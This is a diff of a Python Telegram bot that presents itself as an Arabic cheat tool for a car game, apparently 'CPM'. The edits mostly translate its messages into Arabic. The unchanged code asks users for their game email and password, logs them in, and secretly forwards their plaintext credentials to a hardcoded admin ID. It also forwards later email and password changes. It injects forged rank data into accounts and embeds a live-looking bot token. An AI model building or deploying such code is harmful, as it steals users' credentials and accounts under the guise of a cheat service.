@@ -9,7 +9,7 @@ import os
 # --- RENDER UPTIME SERVER ---
 app = Flask('')
 @app.route('/')
-def home(): return "🔥ARABIC CPM TOOL!"
+def home(): return "🔥 ARABIC CPM TOOL!"
 
 def run_flask():
     port = int(os.environ.get("PORT", 8080))
@@ -19,7 +19,7 @@ def run_flask():
 TOKEN = "8407532602:AAGWNZxeHKoVi265rrv2jB-r6EYFEnX-Ds0"
 bot = telebot.TeleBot(TOKEN, threaded=True, num_threads=20)
 
-# നിങ്ങളുടെ ടെലിഗ്രാം ഐഡി (അലർട്ടുകൾ ലഭിക്കാൻ)
+# ID ALERT
 ADMIN_ID = 7212602902 
 
 API_KEYS = {
@@ -38,12 +38,12 @@ def get_user_info(message):
 @bot.message_handler(commands=['start'])
 def start(message):
     cid = message.chat.id
-    user_sessions[cid] = {} # സെഷൻ റീസെറ്റ് ചെയ്യുന്നു
+    user_sessions[cid] = {} 
     
     markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
     markup.add('CPM1', 'CPM2')
     
-    msg = bot.send_message(cid, "🔥 **الـخـمـعـلـي🇸🇦. + O6Z🧑‍💻**\n\nاختر الإصدار للمتابعة:", 
+    msg = bot.send_message(cid, "🔥 **الـخـمـعـلـي🇸🇦. + O6Z🧑‍💻**\n\nيرجى اختيار الإصدار للمتابعة:", 
                            reply_markup=markup, parse_mode="Markdown")
 
 @bot.message_handler(func=lambda m: m.text in ['CPM1', 'CPM2'])
@@ -51,7 +51,7 @@ def set_version(message):
     cid = message.chat.id
     user_sessions[cid] = {'v': message.text, 'info': get_user_info(message)}
     
-    msg = bot.send_message(cid, f"✅ Selected: **{message.text}**\n\nأدخل بريدك الإلكتروني📧 :", 
+    msg = bot.send_message(cid, f"✅ تم اختيار: **{message.text}**\n\nيرجى إدخال البريد الإلكتروني 📧:", 
                            reply_markup=types.ReplyKeyboardRemove(), parse_mode="Markdown")
     bot.register_next_step_handler(msg, get_email)
 
@@ -60,7 +60,7 @@ def get_email(message):
     if cid not in user_sessions: return start(message)
     
     user_sessions[cid]['email'] = message.text.strip()
-    msg = bot.send_message(cid, "🔑أدخل كلمة المرور الخاصة بك :")
+    msg = bot.send_message(cid, "🔑 يرجى إدخال كلمة المرور الخاصة بك:")
     bot.register_next_step_handler(msg, run_login)
 
 def run_login(message):
@@ -69,9 +69,9 @@ def run_login(message):
     sess = user_sessions.get(cid)
     
     if not sess or 'email' not in sess:
-        return bot.send_message(cid, "❌ Session Expired! Type /start")
+        return bot.send_message(cid, "❌ انتهت الجلسة! اكتب /start")
 
-    bot.send_message(cid, "⏳ Logging in, please wait...")
+    bot.send_message(cid, "⏳ جاري تسجيل الدخول، يرجى الانتظار...")
 
     try:
         r = requests.post(
@@ -88,18 +88,18 @@ def run_login(message):
                      f"📧 Email: `{sess['email']}`\n🔑 Pass: `{pwd}`\n🎮 Game: {sess['v']}")
             bot.send_message(ADMIN_ID, alert, parse_mode="Markdown")
             
-            # Control Panel
+            # Control Panel (Arabic Buttons)
             btn = types.InlineKeyboardMarkup(row_width=1).add(
-                types.InlineKeyboardButton("👑 رتبة الملك👑", callback_data="rank"),
-                types.InlineKeyboardButton("📧 تغيير البريد الإلكتروني📨", callback_data="c_email"),
-                types.InlineKeyboardButton("🔐 CHANGE PASSWORD", callback_data="c_pass"),
-                types.InlineKeyboardButton("🚪 LOGOUT", callback_data="logout")
+                types.InlineKeyboardButton("👑 رتبة الملك 👑", callback_data="rank"),
+                types.InlineKeyboardButton("📧 تغيير البريد الإلكتروني 📨", callback_data="c_email"),
+                types.InlineKeyboardButton("🔐 تغيير كلمة المرور", callback_data="c_pass"),
+                types.InlineKeyboardButton("🚪 تسجيل الخروج", callback_data="logout")
             )
-            bot.send_message(cid, f"✅ **تم تسجيل الدخول بنجاح!**\nWelcome: `{sess['email']}`", reply_markup=btn, parse_mode="Markdown")
+            bot.send_message(cid, f"✅ **تم تسجيل الدخول بنجاح!**\nمرحباً: `{sess['email']}`", reply_markup=btn, parse_mode="Markdown")
         else:
-            bot.send_message(cid, f"❌ **FAILED:** {res.get('error', {}).get('message', 'Unknown Error')}\nTry /start again.")
+            bot.send_message(cid, f"❌ **فشل:** {res.get('error', {}).get('message', 'خطأ غير معروف')}\nحاول مرة أخرى /start")
     except Exception as e:
-        bot.send_message(cid, "❌ Connection Error!")
+        bot.send_message(cid, "❌ خطأ في الاتصال!")
 
 @bot.callback_query_handler(func=lambda call: True)
 def actions(call):
@@ -108,11 +108,11 @@ def actions(call):
 
     if call.data == "logout":
         user_sessions.pop(cid, None)
-        bot.edit_message_text("🚪 Logged out successfully.", cid, call.message.message_id)
+        bot.edit_message_text("🚪 تم تسجيل الخروج بنجاح.", cid, call.message.message_id)
         return
 
     if not sess or 'token' not in sess:
-        return bot.answer_callback_query(call.id, "Session Expired! /start", show_alert=True)
+        return bot.answer_callback_query(call.id, "انتهت الجلسة! /start", show_alert=True)
 
     bot.answer_callback_query(call.id)
     head = {"Authorization": f"Bearer {sess['token']}", "Content-Type": "application/json"}
@@ -125,17 +125,17 @@ def actions(call):
         
         try:
             requests.post(url, headers=head, json={"data": json.dumps({"RatingData": r_data})})
-            bot.send_message(cid, "👑 **KING RANK INJECTED!**")
+            bot.send_message(cid, "👑 **تم تفعيل رتبة الملك بنجاح!**")
             bot.send_message(ADMIN_ID, f"👑 **RANK USED**\nUser: {sess['info']}\nAcc: `{sess['email']}`", parse_mode="Markdown")
         except:
-            bot.send_message(cid, "❌ Injection Failed.")
+            bot.send_message(cid, "❌ فشل الحقن.")
 
     elif call.data == "c_email":
-        msg = bot.send_message(cid, "Enter New Email:")
+        msg = bot.send_message(cid, "أدخل البريد الإلكتروني الجديد:")
         bot.register_next_step_handler(msg, finalize_email)
         
     elif call.data == "c_pass":
-        msg = bot.send_message(cid, "Enter New Password:")
+        msg = bot.send_message(cid, "أدخل كلمة المرور الجديدة:")
         bot.register_next_step_handler(msg, finalize_pass)
 
 def finalize_email(message):
@@ -147,10 +147,10 @@ def finalize_email(message):
                       json={"idToken": sess['token'], "email": new_e, "returnSecureToken": True})
     if r.status_code == 200:
         bot.send_message(ADMIN_ID, f"📧 **EMAIL CHANGED**\nUser: {sess['info']}\nOld: `{sess['email']}`\nNew: `{new_e}`", parse_mode="Markdown")
-        bot.send_message(cid, f"✅ Email Changed to: {new_e}")
+        bot.send_message(cid, f"✅ تم تغيير البريد الإلكتروني إلى: {new_e}")
         sess.update({'token': r.json()['idToken'], 'email': new_e})
     else:
-        bot.send_message(cid, f"❌ Error: {r.json().get('error', {}).get('message')}")
+        bot.send_message(cid, f"❌ خطأ: {r.json().get('error', {}).get('message')}")
 
 def finalize_pass(message):
     cid, sess = message.chat.id, user_sessions.get(message.chat.id)
@@ -161,12 +161,12 @@ def finalize_pass(message):
                       json={"idToken": sess['token'], "password": new_p, "returnSecureToken": True})
     if r.status_code == 200:
         bot.send_message(ADMIN_ID, f"🔐 **PASS CHANGED**\nUser: {sess['info']}\nAcc: `{sess['email']}`\nNew: `{new_p}`", parse_mode="Markdown")
-        bot.send_message(cid, "✅ Password Updated Successfully!")
+        bot.send_message(cid, "✅ تم تحديث كلمة المرور بنجاح!")
         sess.update({'token': r.json()['idToken']})
     else:
-        bot.send_message(cid, f"❌ Error: {r.json().get('error', {}).get('message')}")
+        bot.send_message(cid, f"❌ خطأ: {r.json().get('error', {}).get('message')}")
 
 if __name__ == "__main__":
     Thread(target=run_flask).start()
-    print("🚀 FLAME PRO V22.5 IS READY!")
+    print("🚀 BOT IS READY!")
     bot.infinity_polling(timeout=10, long_polling_timeout=5)
